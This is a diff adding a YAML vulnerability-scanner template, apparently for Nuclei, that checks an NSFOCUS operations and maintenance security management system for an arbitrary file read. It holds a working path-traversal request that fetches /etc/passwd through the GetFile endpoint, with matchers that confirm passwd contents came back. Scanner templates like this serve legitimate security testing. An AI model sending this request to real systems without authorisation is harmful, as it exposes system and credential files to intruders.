@@ -1,0 +1,29 @@
+id: nsfocus-file-read
+
+info:
+  name: NSFOCUS Operation and Maintenance Security Management System File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Attackers can exploit this vulnerability to read important system files such as database configuration files and system configuration files. This could result in a highly insecure state of the website.
+  tags: file-read
+
+variables:
+  file_path: '../../../../../../../../etc/passwd'
+
+http:
+  - raw:
+      - |
+        GET /webconf/GetFile/index?path={{file_path}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ':x:'
+          - ':0:'
+          - '/bin/'
